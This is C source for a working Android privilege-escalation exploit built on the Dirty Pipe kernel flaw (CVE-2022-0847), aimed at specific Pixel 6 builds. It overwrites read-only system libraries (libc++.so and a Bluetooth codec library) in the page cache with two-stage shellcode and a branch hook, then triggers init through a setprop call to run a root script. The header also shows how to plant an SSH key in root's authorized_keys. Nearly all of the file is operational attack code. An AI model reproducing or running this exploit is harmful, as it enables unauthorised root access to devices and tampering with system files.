/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/system_properties.h>
#include <errno.h>

#include "stage2-symbol.h"

extern char stage1_start[];
extern char stage1_data[];
extern uint32_t stage1_len;
extern char stage1_filename[];
extern char stage1_stage2_libname[];
extern char stage1_first_inst_copy[];

#define STAGE1_STAGE2_LIBNAME_LEN 64

#define STAGE2_PAGES (1 + 1 + 4)
extern char stage2_payload[];

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target
		, uint32_t* first_instruction);

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int overwrite(int p[2], int fd, loff_t offset, const char *data, int data_size) {
	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	if(lseek64(fd, 0, SEEK_SET) < 0){
		perror("lseek64");
		return EXIT_FAILURE;
	}

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	loff_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}
	return 0;
}

int load_run_index(const char *base_dir) {
	char run_index_path[500];
	int run_index = 0;

	sprintf(run_index_path, "%s/dirtypipe-run-index", base_dir);

	int fd = open(run_index_path, O_RDONLY);
	if(fd >= 0){
		char buf[100];
		read(fd, buf, sizeof(buf) - 1);
		close(fd);

		buf[sizeof(buf) - 1] = 0;
		run_index = atoi(buf);
	}

	if(run_index < 0 || 9999 <= run_index){
		run_index = 0;
	}

	fd = open(run_index_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if(fd >= 0){
		char buf[100];
		sprintf(buf, "%d", run_index + 1);
		write(fd, buf, strlen(buf));
		close(fd);
	}

	return run_index;
}

/*
This function is called in /system/bin/init when run setprop command.

Pixel 6 2022-02-05
$ llvm-objdump -TC libc++.so
000000000005a9dc  w   DF .text  0000000000000040 std::__1::basic_streambuf<char, std::__1::char_traits<char> >::basic_streambuf()

Mangled: _ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev
*/

void sighandler_empty(int a){}

int main(int argc, char **argv)
{
	const char *stage1_lib = "/system/lib64/libc++.so";
	const char *stage2_lib = "/system/lib/libldacBT_enc.so";
	const char *stage2_param_libname = NULL;
	size_t data_size;
	uint64_t shellcode_offset = 0;
	uint64_t hook_offset = 0;
	uint32_t first_instruction = 0;

	char product[PROP_VALUE_MAX] = {};
	char fingerprint[PROP_VALUE_MAX] = {};
	__system_property_get("ro.build.product", product);
	__system_property_get("ro.build.fingerprint", fingerprint);

	if(argc >= 2 && strcmp(argv[1], "-f") == 0){
		printf("Ignore device info.\n");
		if(argc >= 3){
			stage2_param_libname = argv[2];
		}else{
			stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
		}
		if(argc >= 4){
			stage2_lib = argv[3];
		}
	}else{
		if(strcmp(product, "oriole") == 0){
			if(strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys") == 0){
				// Pixel 6 2022-02-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else if(strcmp(fingerprint, "google/oriole/oriole:12/SP2A.220305.013.A3/8229987:user/release-keys") == 0){
				// Pixel 6 2022-03-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else if(strcmp(fingerprint, "google/oriole/oriole:12/SP2A.220405.004/8233519:user/release-keys") == 0){
				// Pixel 6 2022-04-05
				stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
			}else{
				fprintf(stderr, "Unsupported version: Product=%s Fingerprint=%s\n", product, fingerprint);
				return EXIT_FAILURE;
			}
		}else{
			fprintf(stderr, "Unsupported product: Product=%s Fingerprint=%s\n", product, fingerprint);
			return EXIT_FAILURE;
		}
	}
	printf("Device version: Product=%s Fingerprint=%s\n", product, fingerprint);
	printf("stage1_lib: %s\n", stage1_lib);
	printf("stage2_lib: %s\n", stage2_lib);
	printf("stage2_param_libname: %s\n", stage2_param_libname);
	if(strlen(stage2_lib) >= STAGE1_STAGE2_LIBNAME_LEN){
		fprintf(stderr, "Too long stage2_lib\n");
		return EXIT_FAILURE;
	}

	if(find_hook_target(stage1_lib, &hook_offset, &shellcode_offset, &first_instruction)){
		fprintf(stderr, "Could not find hook target and shellcode offset from libc++.so\n");
		return EXIT_FAILURE;
	}
	printf("Offset found: shellcode_offset: %lx hook_offset: %lx first instruction: %08x\n", shellcode_offset, hook_offset, first_instruction);

	uint64_t empty_space = (PAGE_SIZE - (shellcode_offset % PAGE_SIZE)) % PAGE_SIZE;
	printf("Empty space size: %ld bytes\n", empty_space);

	if(stage1_len > empty_space){
		fprintf(stderr, "Stage1 payload (%d bytes) is too large. Exit.\n", stage1_len);
		return EXIT_FAILURE;
	}

	char base_dir[256] = {};

	char *tmp;
	if((tmp = getenv("BASE_DIR")) != NULL) {
		strcpy(base_dir, tmp);
	} else {
		readlink("/proc/self/exe", base_dir, sizeof(base_dir) - 1);
		*strrchr(base_dir, '/') = 0;
	}
	int run_index = load_run_index(base_dir);

	printf("base dir: %s\n", base_dir);
	printf("Run index: %d\n", run_index);

	// Shellcode is placed in empty space on .text
	// Max size=544 bytes
	//size_t shellcode_offset = 0x000a2de0UL;
	//size_t hook_offset      = 0x0005a9dcUL;

	// Aarch64 branch
	const uint32_t BRANCH = 0x14000000;

	// Build branch instruction for first instruction of hook target.
	uint32_t hook_data = BRANCH;
	uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
	hook_data |= (shellcode_offset + start_offset - hook_offset) >> 2;
	int hook_data_size = 4;

	sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
	printf("Stage1 debug filename: %s\n", stage1_filename);
	strcpy(stage1_stage2_libname, stage2_lib);

	// Jump back to hook target + 4.
	uint32_t jmpback = BRANCH;
	jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
	*(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;

	*(uint32_t *)&stage1_first_inst_copy[0] = first_instruction;

	printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);

	// Embed stage2 libname
	int libname_len = strlen(stage2_param_libname);
	if(libname_len >= 128 - 1){
		fprintf(stderr, "Too long libname: %s\n", stage2_param_libname);
		return EXIT_FAILURE;
	}
	memcpy(stage2_payload + stage2_libname_addr, stage2_param_libname, libname_len + 1);

	// Embed the path of root startup script.
	char root_cmd[500];
	strcpy(root_cmd, base_dir);
	strcat(root_cmd, "/startup-root");
	if(strlen(root_cmd) >= 128 - 1){
		fprintf(stderr, "Too long root_cmd: %s\n", root_cmd);
		return EXIT_FAILURE;
	}
	memcpy(stage2_payload + stage2_root_cmd_addr, root_cmd, strlen(root_cmd) + 1);
	printf("startup script: %s\n", root_cmd);
	chmod(root_cmd, 0755);

	int fd2 = open(stage2_lib, O_RDONLY); // yes, read-only! :-)
	if (fd2 < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	int fd1 = open(stage1_lib, O_RDONLY); // yes, read-only! :-)
	if (fd1 < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	// Backup original content.
	char *stage2_backup = (char *)malloc(STAGE2_PAGES * PAGE_SIZE);
	if(read(fd2, stage2_backup, STAGE2_PAGES * PAGE_SIZE) < 0){
		perror("read backup stage2");
	}
	char *stage1_backup = (char *)malloc(stage1_len);
	if(lseek64(fd1, shellcode_offset, SEEK_SET) < 0){
		perror("lseek64");
	}
	if(read(fd1, stage1_backup, stage1_len) < 0){
		perror("read backup stage1");
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	// Send stage2 first.
	for(int i = 0; i < STAGE2_PAGES; i++){
		overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_payload + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
	}
	// Send stage1
	overwrite(p, fd1, shellcode_offset, stage1_data, stage1_len);
	overwrite(p, fd1, hook_offset, (char*)&hook_data, hook_data_size);

	// Trigger
	system("setprop a a");

	signal(SIGCHLD, SIG_IGN);

	if(fork() == 0){
		// Disconnect child from adb shell.
		setsid();
		close(0);
		close(1);
		close(2);

		signal(SIGHUP, SIG_IGN);
		// The default action of SIGUSR1 is termination of process. We don't like it.
		signal(SIGUSR1, sighandler_empty);

		// SIGUSR1 will be sent by startup-script to notify completion of exploit
		sigset_t set;
		sigemptyset(&set);
		sigaddset(&set, SIGHUP);
		sigaddset(&set, SIGINT);
		sigaddset(&set, SIGTERM);
		sigaddset(&set, SIGKILL);
		sigaddset(&set, SIGUSR1);
		int sig;
		int ret = sigwait(&set, &sig);

		// Restore stage1
		overwrite(p, fd1, hook_offset, (char*)&first_instruction, hook_data_size);
		overwrite(p, fd1, shellcode_offset, stage1_backup, stage1_len);
		// Restore stage2
		for(int i = 0; i < STAGE2_PAGES; i++){
			overwrite(p, fd2, i * PAGE_SIZE + 1, stage2_backup + i * PAGE_SIZE + 1, PAGE_SIZE - 1);
		}

		exit(0);
	}

	printf("It worked!\n");

	return EXIT_SUCCESS;
}
